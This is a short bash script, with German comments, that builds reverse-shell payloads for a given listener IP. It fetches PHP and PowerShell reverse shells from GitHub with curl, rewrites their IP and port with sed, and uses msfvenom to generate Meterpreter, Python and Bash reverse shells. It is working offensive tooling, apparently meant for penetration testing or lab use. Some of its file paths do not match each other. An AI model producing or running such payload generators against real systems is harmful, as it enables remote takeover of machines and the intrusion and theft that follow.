#!/bin/bash

usage() {
  echo "Usage: $0 <LHOST>"
  echo "  <LHOST> - IP-Adresse für den Listener (z.B. deine lokale oder öffentliche IP)"
  exit 1
}

# Prüfen, ob exakt1 Argumente übergeben wurden
if [ "$#" -ne 1 ]; then
  usage
fi

IP=$1

rm ./revshell.php
echo "Creating php revshell on $IP:5555"
curl -L https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php >> .revshell.php

SCRIPT="./revshell.php"

sed -i "s/\(\$ip = '\)[^']*\(';\)/\1$IP\2/" "$SCRIPT"
sed -i "s/\(\$port = \)[0-9]*\(;.*\)/\15555\2/" "$SCRIPT"
echo "Created php"

rm ./revshell.ps1
echo "Creating ps1 revshell on $IP:6666"
curl -L https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/refs/heads/main/powershell-reverse-shell.ps1 >> ./revshell.ps1

SCRIPT="./revshell.ps1"

sed -i "s|TCPClient('.*', [0-9]\+)|TCPClient('$IP', 6666)|" "$SCRIPT"

rm ./revshell.exe
echo "Creating meterpreter exe revshell on $IP:7777"
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=$IP LPORT=7777 -o ./revshell.exe

rm ./revshell.py
echo "Creating python revshell on $IP:8888"
msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=8888 -f raw > ./revshell.py

rm ./revshell.sh
echo "Creating bash revshell on $IP:9999"
msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=9999 -f raw > ./Tools/revshell.sh
